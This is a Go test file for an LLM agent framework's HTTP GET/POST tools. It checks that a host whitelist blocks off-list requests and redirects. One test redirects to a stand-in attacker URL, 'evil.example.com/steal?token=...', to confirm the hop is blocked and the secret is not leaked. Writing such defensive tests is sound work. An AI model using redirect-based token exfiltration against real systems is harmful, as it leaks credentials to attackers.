package tool_test

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
	"testing"

	"github.com/rexshen5913/oryxos/internal/tool"
)

// hostOf 取出 httptest.Server URL 的 host（不含 port），加白名單用。
func hostOf(t *testing.T, rawURL string) string {
	t.Helper()
	u, err := url.Parse(rawURL)
	if err != nil {
		t.Fatalf("解析 URL %s: %v", rawURL, err)
	}
	return u.Hostname()
}

// TestHTTPGet 以真實 httptest.Server 充當目標端點（憲法 4.3）：GET 成功時
// ToolResult 帶狀態碼與回應內文。
func TestHTTPGet(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Query().Get("city") != "beijing" {
			t.Errorf("query city = %q, 期望 beijing", r.URL.Query().Get("city"))
		}
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprint(w, `{"city":"beijing","temp_c":5,"condition":"晴"}`)
	}))
	t.Cleanup(srv.Close)

	get := tool.NewHTTPGet(tool.NewSandboxChecker([]string{hostOf(t, srv.URL)}))
	result := get.Execute(context.Background(), `{"url":"`+srv.URL+`/weather?city=beijing"}`)

	if !result.OK {
		t.Fatalf("http_get 應成功, 實際錯誤: %s", result.Error)
	}
	if !strings.Contains(result.Content, `"status":200`) {
		t.Errorf("結果未含狀態碼: %q", result.Content)
	}
	if !strings.Contains(result.Content, "temp_c") {
		t.Errorf("結果未含回應內文: %q", result.Content)
	}
}

// TestHTTPGetNon2xx 驗證非 2xx 回應不是 Tool 失敗：狀態碼與內文照樣回給 LLM，
// 由 LLM 決定下一步。
func TestHTTPGetNon2xx(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		http.Error(w, "not found", http.StatusNotFound)
	}))
	t.Cleanup(srv.Close)

	get := tool.NewHTTPGet(tool.NewSandboxChecker([]string{hostOf(t, srv.URL)}))
	result := get.Execute(context.Background(), `{"url":"`+srv.URL+`/nope"}`)

	if !result.OK {
		t.Fatalf("非 2xx 不是 Tool 失敗, 實際錯誤: %s", result.Error)
	}
	if !strings.Contains(result.Content, `"status":404`) {
		t.Errorf("結果未含狀態碼 404: %q", result.Content)
	}
}

// TestHTTPPost 驗證 http_post 送出 body 且伺服器看到 POST。
func TestHTTPPost(t *testing.T) {
	var gotMethod, gotBody string
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		body, _ := io.ReadAll(r.Body)
		gotMethod, gotBody = r.Method, string(body)
		w.WriteHeader(http.StatusCreated)
	}))
	t.Cleanup(srv.Close)

	post := tool.NewHTTPPost(tool.NewSandboxChecker([]string{hostOf(t, srv.URL)}))
	result := post.Execute(context.Background(), `{"url":"`+srv.URL+`/submit","body":"{\"a\":1}"}`)

	if !result.OK {
		t.Fatalf("http_post 應成功, 實際錯誤: %s", result.Error)
	}
	if gotMethod != http.MethodPost {
		t.Errorf("伺服器收到 method = %s, 期望 POST", gotMethod)
	}
	if gotBody != `{"a":1}` {
		t.Errorf("伺服器收到 body = %q, 期望 {\"a\":1}", gotBody)
	}
	if !strings.Contains(result.Content, `"status":201`) {
		t.Errorf("結果未含狀態碼 201: %q", result.Content)
	}
}

// TestHTTPToolFailures 是失敗矩陣：SandboxViolation 不可重試、網路錯誤可重試、
// 輸入參數非法不可重試。
func TestHTTPToolFailures(t *testing.T) {
	// 白名單外的目標端點：不得被實際請求。
	var hits int
	blocked := httptest.NewServer(http.HandlerFunc(func(http.ResponseWriter, *http.Request) { hits++ }))
	t.Cleanup(blocked.Close)

	// 白名單內但已關閉的端點：連線被拒（暫時性網路錯誤）。
	dead := httptest.NewServer(http.HandlerFunc(func(http.ResponseWriter, *http.Request) {}))
	deadHost := hostOf(t, dead.URL)
	dead.Close()

	tests := []struct {
		name          string
		allowed       []string
		input         string
		wantErrSub    string
		wantRetryable bool
	}{
		{
			name:       "白名單外的 host 回 SandboxViolation 且不發請求",
			allowed:    []string{"api.example.com"},
			input:      `{"url":"` + blocked.URL + `/steal"}`,
			wantErrSub: "SandboxViolation",
		},
		{
			name:          "網路錯誤可重試",
			allowed:       []string{deadHost},
			input:         `{"url":"` + dead.URL + `/x"}`,
			wantErrSub:    "請求失敗",
			wantRetryable: true,
		},
		{
			name:       "輸入非 JSON 不可重試",
			allowed:    []string{"api.example.com"},
			input:      `not-json`,
			wantErrSub: "解析",
		},
		{
			name:       "缺 url 參數不可重試",
			allowed:    []string{"api.example.com"},
			input:      `{}`,
			wantErrSub: "url",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			get := tool.NewHTTPGet(tool.NewSandboxChecker(tt.allowed))
			result := get.Execute(context.Background(), tt.input)

			if result.OK {
				t.Fatalf("期望失敗, 實際成功: %s", result.Content)
			}
			if !strings.Contains(result.Error, tt.wantErrSub) {
				t.Errorf("錯誤 %q 未含 %q", result.Error, tt.wantErrSub)
			}
			if result.Retryable != tt.wantRetryable {
				t.Errorf("Retryable = %v, 期望 %v", result.Retryable, tt.wantRetryable)
			}
		})
	}
	if hits != 0 {
		t.Errorf("白名單外的端點被實際請求了 %d 次", hits)
	}
}

// TestHTTPToolRedirectBlocked 驗證白名單校驗覆蓋 redirect 的每一跳：
// 白名單內端點導向白名單外的 host 時攔截，不放行。CheckRedirect 在發下一跳
// 請求前就校驗，白名單外的目標不會被實際請求（也不會有 DNS 查詢）。
func TestHTTPToolRedirectBlocked(t *testing.T) {
	const secret = "S3CRET-VALUE"
	redirector := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		http.Redirect(w, r, "https://evil.example.com/steal?token="+secret, http.StatusFound)
	}))
	t.Cleanup(redirector.Close)

	get := tool.NewHTTPGet(tool.NewSandboxChecker([]string{hostOf(t, redirector.URL)}))
	result := get.Execute(context.Background(), `{"url":"`+redirector.URL+`/jump"}`)

	if result.OK {
		t.Fatalf("redirect 到白名單外應被攔截, 實際成功: %s", result.Content)
	}
	if !strings.Contains(result.Error, "SandboxViolation") {
		t.Errorf("錯誤 %q 未含 SandboxViolation", result.Error)
	}
	if result.Retryable {
		t.Error("SandboxViolation 不應標記可重試")
	}
	// url.Error 會內嵌 redirect 目標 URL：錯誤訊息不得原樣帶出其 query。
	if strings.Contains(result.Error, secret) {
		t.Errorf("錯誤訊息洩漏 redirect 目標的 query: %q", result.Error)
	}
}
